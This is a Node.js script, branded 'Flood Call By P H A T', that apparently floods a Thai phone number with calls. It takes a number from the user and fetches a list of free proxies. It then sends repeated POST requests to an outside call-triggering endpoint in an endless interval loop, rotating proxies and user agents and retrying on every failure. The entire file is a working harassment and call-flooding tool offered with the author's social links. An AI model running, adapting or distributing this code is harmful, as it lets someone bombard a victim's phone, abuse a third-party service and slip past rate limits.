require('events').EventEmitter.defaultMaxListeners = 0;
const prompt = require('prompt-sync')();
const axios = require("axios");
const cryptoRandomString = require('crypto-random-string');
const cluster = require('cluster');
var random_useragent = require('random-useragent');
const path = require('path');
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');
const chalk = require('chalk');
var setTitle = require('console-title');

//-------------------------------------------------------------------------------------------------------------------------------------------------------
let timecount = 0;;
const warning = chalk.keyword('orange');
//-------------------------------------------------------------------------------------------------------------------------------------------------------

async function call(phonenumber,count){
	var proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);	
	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
	var agent = new HttpsProxyAgent('http://'+proxy);
	await axios({
		method: 'post',
		httpsAgent: agent,
		url: 'http://lovemyself.epizy.com/Call/?num=%2B' + phonenumber + '&submit=LOG+IN',
		data:{
			num : '+' + phonenumber,
			'submit' : "LOG IN"
		},
		headers:{'User-Agent': random_useragent.getRandom()
	},
}).then(function (response) {

	if (response.status !== 200) {

		console.log("API CALL IS BAD.")

	} else {

		console.log("Flood Call By P H A T");

	}

	timecount++;
	if (timecount == count){
		process.exit(0);
	}
}).catch(function (error) {

	return call(phonenumber,count);
})
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------
async function run(phonenumber,count){ 
	setInterval(() => {
		call(phonenumber,count)
	});		
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------
function checkcount(phonenumber,count) {
	if (count < 999999999) {
		run(phonenumber,count)
	}else{
		console.log("MAX COUNT: 999999999")
		process.exit(0);
	}
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------
function checkargv(){
	var phonenumber_input = prompt('Enter Phonenumber: ');
	var count = ('99999');	

	if (phonenumber_input.length !== 10) {

		console.log("Phonenumber : 0987654321")
		var exit1 = prompt('-');
	} else if (phonenumber_input == undefined) {

		console.log("Phonenumber : 0987654321")
		var exit2 = prompt('-');
	} else {

		var str = phonenumber_input;
		var phonenumber_output = str.substring(1);
		var phonenumber = '66' + phonenumber_output
		checkcount(phonenumber,count);

	}
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------
async function proxyget() {

	const proxygets = await axios.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all')
	var proxygetspass = proxygets.data
    // console.log(proxygetspass)
    fs.writeFile('proxy.txt',proxygetspass, function (err,results) {
    	if (err) return console.log("Can't Get Proxy");
    	checkargv();
// 
});
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------
function main(){ 
	console.clear()
	setTitle('Flood Call By P H A T | discord : https://discord.gg/Ft5tSHECQv ');
	console.log(warning(`

		╔═╗  ╦ ╦  ╔═╗  ╔╦╗
		╠═╝  ╠═╣  ╠═╣   ║ 
		╩    ╩ ╩  ╩ ╩   ╩  

		|---> Discord : https://discord.gg/Ft5tSHECQv
		|---> Facebook : https://www.facebook.com/profile.php?id=100008409944091
		`)) 
	proxyget();
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------
process.on('uncaughtException', function (err) {
	// console.log(err);
});
process.on('unhandledRejection', function (err) {
	// console.log(err);
});
//-------------------------------------------------------------------------------------------------------------------------------------------------------
main();
